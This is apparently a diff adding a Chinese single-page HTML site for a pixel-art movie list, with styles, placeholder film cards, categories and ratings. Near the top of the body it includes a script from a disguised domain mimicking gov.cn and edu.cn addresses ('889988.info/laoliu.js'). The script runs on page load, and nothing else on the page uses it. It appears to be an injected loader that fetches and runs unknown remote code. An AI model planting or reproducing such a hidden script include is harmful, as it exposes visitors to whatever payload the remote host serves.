@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4000电影网 - 复古像素风影视片单与分类导航</title>
+<meta name="description" content="4000电影网(4000dianyingwang-h5.github.io)提供电影片单、类型分类、热门评分与正版观影指引，复古8-bit像素风单页，移动自适应，符合必应收录规则。">
+<meta name="keywords" content="4000电影网, 4000dianyingwang-h5.github.io, 电影片单, 像素风影视导航, 电影分类, 热门评分榜">
+<meta name="author" content="4000电影网">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --bg:#0d1117;
+  --panel:#161b22;
+  --green:#00ff87;
+  --green-dim:#00cc6a;
+  --red:#ff004d;
+  --yellow:#ffd300;
+  --blue:#00b8ff;
+  --purple:#bd00ff;
+  --text:#c9d1d9;
+  --muted:#8b949e;
+  --border:3px solid var(--green);
+  --shadow:4px 4px 0 var(--red);
+  --shadow-blue:4px 4px 0 var(--blue);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"Courier New",Courier,monospace;background:var(--bg);color:var(--text);line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.15s}
+.wrap{width:min(1100px,92%);margin:0 auto}
+
+/* 像素导航 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(13,17,23,.95);border-bottom:var(--border)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900}
+.pixel-logo{width:40px;height:40px;background:var(--green);display:grid;place-items:center;color:var(--bg);font-size:18px;font-weight:900;box-shadow:3px 3px 0 var(--red)}
+.brand b{font-size:18px;color:var(--green);letter-spacing:1px}
+.brand small{display:block;font-size:10px;color:var(--muted)}
+.nav{display:flex;gap:8px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:6px 12px;border:2px solid var(--green);background:transparent;color:var(--green);font-weight:700}
+.nav a:hover{background:var(--green);color:var(--bg);transform:translate(-2px,-2px);box-shadow:2px 2px 0 var(--red)}
+.menu-btn{display:none;background:var(--red);color:#fff;border:2px solid var(--red);padding:8px 14px;font-size:14px;font-family:inherit;cursor:pointer;font-weight:700}
+
+/* Hero 终端 */
+#home{padding:60px 0 42px;background:var(--bg)}
+.hero{display:grid;grid-template-columns:1fr 1fr;gap:30px;align-items:center;min-height:380px}
+.terminal{background:var(--panel);border:var(--border);padding:24px;box-shadow:var(--shadow)}
+.terminal-header{display:flex;gap:6px;margin-bottom:16px;padding-bottom:12px;border-bottom:2px dashed #30363d}
+.dot{width:12px;height:12px;background:var(--red);border:1px solid #fff}
+.dot:nth-child(2){background:var(--yellow)}
+.dot:nth-child(3){background:var(--green)}
+.terminal h1{font-size:clamp(24px,4vw,40px);color:var(--green);margin-bottom:12px;line-height:1.3}
+.terminal h1 .cursor{display:inline-block;width:12px;height:1em;background:var(--green);animation:blink 1s step-end infinite;vertical-align:text-bottom}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.terminal p{font-size:14px;color:var(--muted);margin-bottom:16px}
+.terminal .cmd{color:var(--yellow);margin-bottom:4px;display:block}
+.terminal .cmd:before{content:"> ";}
+.cta{display:inline-block;background:var(--red);color:#fff;font-weight:700;padding:10px 24px;border:2px solid var(--red);box-shadow:var(--shadow-blue);font-family:inherit;font-size:14px;cursor:pointer}
+.cta:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--blue)}
+
+/* 像素画区域 */
+.pixel-art{display:grid;grid-template-columns:repeat(8,1fr);gap:2px;aspect-ratio:1}
+.px{background:var(--panel);border:1px solid #21262d}
+.px:nth-child(5n){background:var(--green)}
+.px:nth-child(7n){background:var(--red)}
+.px:nth-child(11n){background:var(--yellow)}
+.px:nth-child(13n){background:var(--blue)}
+.px.active{background:var(--green);box-shadow:inset 0 0 8px rgba(0,255,135,.5)}
+.px.active2{background:var(--red);box-shadow:inset 0 0 8px rgba(255,0,77,.5)}
+.px.active3{background:var(--yellow);box-shadow:inset 0 0 8px rgba(255,211,0,.5)}
+
+/* 通用 */
+section.block{padding:50px 0}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
+.sec-head .pixel-icon{width:16px;height:16px;background:var(--yellow);box-shadow:2px 2px 0 var(--red)}
+.sec-head h2{font-size:22px;color:var(--green)}
+.sec-head span{margin-left:auto;font-size:12px;color:var(--muted)}
+
+/* 片单 - 像素卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:20px}
+.pixel-card{background:var(--panel);border:3px solid var(--green);padding:0;box-shadow:var(--shadow);transition:.2s;overflow:hidden}
+.pixel-card:hover{transform:translate(-3px,-3px);box-shadow:7px 7px 0 var(--red)}
+.card-img{height:140px;display:grid;place-items:center;font-size:48px;background:var(--bg);border-bottom:3px solid var(--green)}
+.card-body{padding:14px}
+.card-body h3{font-size:15px;color:var(--green);margin-bottom:6px}
+.card-body p{font-size:12px;color:var(--muted);margin-bottom:10px}
+.card-tags{display:flex;gap:6px;flex-wrap:wrap}
+.card-tags span{font-size:10px;padding:2px 8px;border:1px solid var(--blue);color:var(--blue)}
+.card-tags span:nth-child(2){border-color:var(--purple);color:var(--purple)}
+.card-tags span:nth-child(3){border-color:var(--yellow);color:var(--yellow)}
+
+/* 分类 - 游戏菜单式 */
+.menu-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.menu-item{background:var(--panel);border:3px solid var(--text);padding:20px 12px;text-align:center;transition:.2s;cursor:pointer}
+.menu-item:hover{border-color:var(--green);background:var(--green);color:var(--bg)}
+.menu-item .icon{font-size:28px;display:block;margin-bottom:8px}
+.menu-item h3{font-size:13px;font-weight:700}
+.menu-item:nth-child(1){border-color:var(--red);color:var(--red)}
+.menu-item:nth-child(2){border-color:var(--blue);color:var(--blue)}
+.menu-item:nth-child(3){border-color:var(--yellow);color:var(--yellow)}
+.menu-item:nth-child(4){border-color:var(--purple);color:var(--purple)}
+.menu-item:nth-child(5){border-color:var(--green);color:var(--green)}
+.menu-item:nth-child(6){border-color:var(--red);color:var(--red)}
+.menu-item:nth-child(7){border-color:var(--blue);color:var(--blue)}
+.menu-item:nth-child(8){border-color:var(--yellow);color:var(--yellow)}
+
+/* 评分 - HP血条 */
+.hp-list{display:grid;gap:16px}
+.hp-row{background:var(--panel);border:3px solid #30363d;padding:16px}
+.hp-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.hp-top h3{font-size:15px;color:var(--green)}
+.hp-top b{color:var(--yellow);font-size:18px}
+.hp-bar{height:20px;border:2px solid #30363d;background:var(--bg);position:relative;overflow:hidden}
+.hp-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--yellow),var(--green));transition:width .5s}
+.hp-label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:11px;color:#fff;text-shadow:1px 1px 0 #000;font-weight:700}
+.hp-desc{font-size:12px;color:var(--muted);margin-top:8px}
+
+/* 关于 - DOS终端 */
+#about{background:var(--panel);border-top:var(--border)}
+.dos-window{width:min(800px,92%);margin:0 auto;background:var(--bg);border:var(--border);box-shadow:var(--shadow-blue)}
+.dos-title{background:var(--green);color:var(--bg);padding:6px 12px;font-size:12px;font-weight:700;display:flex;justify-content:space-between}
+.dos-body{padding:24px;font-size:14px;line-height:1.8}
+.dos-body p{margin-bottom:12px}
+.dos-body .url{color:var(--yellow);word-break:break-all}
+.dos-body .highlight{color:var(--red)}
+.dos-cursor{display:inline-block;width:8px;height:14px;background:var(--green);animation:blink 1s step-end infinite;vertical-align:middle}
+
+footer{background:#010409;border-top:2px solid #30363d;color:var(--muted);text-align:center;padding:24px 0;font-size:12px}
+footer a{color:var(--green)}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .terminal{text-align:left}
+  .pixel-art{max-width:320px;margin:0 auto}
+  .menu-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;gap:6px;padding:10px 0}
+  .menu-btn{display:inline-block}
+  .grid{grid-template-columns:1fr}
+  .menu-grid{grid-template-columns:1fr 1fr}
+  .sec-head h2{font-size:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="pixel-logo" aria-label="4000像素logo">4K</div>
+      <div>
+        <b>4000电影网</b>
+        <small>4000dianyingwang-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">MENU</button>
+    <nav class="nav" id="nav">
+      <a href="#home">HOME</a>
+      <a href="#list">LIST</a>
+      <a href="#category">TYPE</a>
+      <a href="#score">TOP</a>
+      <a href="#about">ABOUT</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 首页 -->
+  <section id="home">
+    <div class="wrap hero">
+      <div class="terminal">
+        <div class="terminal-header"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        <h1>4000电影网<span class="cursor"></span></h1>
+        <span class="cmd">init_movie_db --load</span>
+        <p>复古像素风影视导航系统 v4.0.0<br>正在加载片单数据库... 完成！</p>
+        <p>提供电影片单、类型分类、热门评分与正版观影指引。单页自适应，符合必应收录规则。</p>
+        <a class="cta" href="#list">▶ START LIST</a>
+      </div>
+      <div class="pixel-art" aria-hidden="true">
+        <div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px"></div><div class="px"></div><div class="px active3"></div><div class="px"></div><div class="px active"></div>
+        <div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px active"></div><div class="px"></div><div class="px active3"></div><div class="px"></div>
+        <div class="px active3"></div><div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px"></div><div class="px active"></div><div class="px"></div>
+        <div class="px"></div><div class="px active2"></div><div class="px"></div><div class="px active3"></div><div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div>
+        <div class="px active"></div><div class="px"></div><div class="px active3"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px"></div><div class="px active"></div>
+        <div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px active3"></div><div class="px"></div><div class="px active"></div><div class="px"></div>
+        <div class="px active2"></div><div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active3"></div><div class="px active2"></div><div class="px"></div><div class="px active"></div>
+        <div class="px"></div><div class="px active3"></div><div class="px active"></div><div class="px"></div><div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px"></div>
+        <div class="px active"></div><div class="px"></div><div class="px active2"></div><div class="px"></div><div class="px"></div><div class="px active3"></div><div class="px active"></div><div class="px"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 片单 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="pixel-icon"></div><h2>MOVIE_LIST.dat</h2><span>像素卡片网格</span></div>
+      <div class="grid">
+        <article class="pixel-card"><div class="card-img">🎮</div><div class="card-body"><h3>像素大冒险</h3><p>动画/冒险 · 8-bit世界拯救任务</p><div class="card-tags"><span>动画</span><span>冒险</span><span>游戏</span></div></div></article>
+        <article class="pixel-card"><div class="card-img">🤖</div><div class="card-body"><h3>机械之心</h3><p>科幻/动作 · AI觉醒与逃亡</p><div class="card-tags"><span>科幻</span><span>动作</span></div></div></article>
+        <article class="pixel-card"><div class="card-img">🧙</div><div class="card-body"><h3>魔法卷轴</h3><p>奇幻/喜剧 · 菜鸟巫师的错误咒语</p><div class="card-tags"><span>奇幻</span><span>喜剧</span></div></div></article>
+        <article class="pixel-card"><div class="card-img">🏎️</div><div class="card-body"><h3>极速代码</h3><p>动作/竞速 · 黑客与赛车手</p><div class="card-tags"><span>动作</span><span>竞速</span></div></div></article>
+        <article class="pixel-card"><div class="card-img">🧟</div><div class="card-body"><h3>像素丧尸</h3><p>恐怖/喜剧 · 方块世界的生存战</p><div class="card-tags"><span>恐怖</span><span>喜剧</span></div></div></article>
+        <article class="pixel-card"><div class="card-img">🚀</div><div class="card-body"><h3>星际矿工</h3><p>科幻/冒险 · 深空资源采集任务</p><div class="card-tags"><span>科幻</span><span>冒险</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 分类 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="pixel-icon"></div><h2>CATEGORY.sys</h2><span>游戏菜单式入口</span></div>
+      <div class="menu-grid">
+        <a class="menu-item" href="#"><span class="icon">⚔️</span><h3>动作格斗</h3></a>
+        <a class="menu-item" href="#"><span class="icon">🧠</span><h3>解谜冒险</h3></a>
+        <a class="menu-item" href="#"><span class="icon">💖</span><h3>恋爱养成</h3></a>
+        <a class="menu-item" href="#"><span class="icon">🌍</span><h3>开放世界</h3></a>
+        <a class="menu-item" href="#"><span class="icon">🏎️</span><h3>竞速体育</h3></a>
+        <a class="menu-item" href="#"><span class="icon">👻</span><h3>恐怖生存</h3></a>
+        <a class="menu-item" href="#"><span class="icon">🎭</span><h3>角色扮演</h3></a>
+        <a class="menu-item" href="#"><span class="icon">🎬</span><h3>剧情向</h3></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 评分 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="pixel-icon"></div><h2>SCORE.hp</h2><span>HP血条评分</span></div>
+      <div class="hp-list">
+        <div class="hp-row">
+          <div class="hp-top"><h3>1. 像素大冒险</h3><b>98 HP</b></div>
+          <div class="hp-bar"><div class="hp-fill" style="width:98%"></div><div class="hp-label">98/100</div></div>
+          <p class="hp-desc">动画冒险 · 创意满分，8-bit情怀拉满</p>
+        </div>
+        <div class="hp-row">
+          <div class="hp-top"><h3>2. 机械之心</h3><b>94 HP</b></div>
+          <div class="hp-bar"><div class="hp-fill" style="width:94%"></div><div class="hp-label">94/100</div></div>
+          <p class="hp-desc">科幻动作 · 节奏紧凑，视效惊艳</p>
+        </div>
+        <div class="hp-row">
+          <div class="hp-top"><h3>3. 魔法卷轴</h3><b>89 HP</b></div>
+          <div class="hp-bar"><div class="hp-fill" style="width:89%"></div><div class="hp-label">89/100</div></div>
+          <p class="hp-desc">奇幻喜剧 · 笑点密集，设定有趣</p>
+        </div>
+        <div class="hp-row">
+          <div class="hp-top"><h3>4. 极速代码</h3><b>85 HP</b></div>
+          <div class="hp-bar"><div class="hp-fill" style="width:85%"></div><div class="hp-label">85/100</div></div>
+          <p class="hp-desc">动作竞速 · 飙车与黑客元素结合</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 关于 -->
+  <section id="about" class="block">
+    <div class="dos-window">
+      <div class="dos-title"><span>C:\4000MOVIE\ABOUT.EXE</span><span>▼</span></div>
+      <div class="dos-body">
+        <p><span class="highlight">4000电影网</span> 是一个复古像素风单页影视导航系统。</p>
+        <p>功能模块：<br>- MOVIE_LIST.dat (片单浏览)<br>- CATEGORY.sys (类型筛选)<br>- SCORE.hp (评分系统)</p>
+        <p>官方网址：<br><span class="url">https://4000dianyingwang-h5.github.io</span></p>
+        <p>状态：ONLINE | 内页链接以 # 占位 | 仅作演示索引</p>
+        <p>> 按任意键继续...<span class="dos-cursor"></span></p>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 4000电影网 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>官方网址：<a href="https://4000dianyingwang-h5.github.io">https://4000dianyingwang-h5.github.io</a></p>
+    <p>关键词：4000电影网、4000dianyingwang-h5.github.io、复古像素风电影片单</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+</script>
+</body>
+</html>
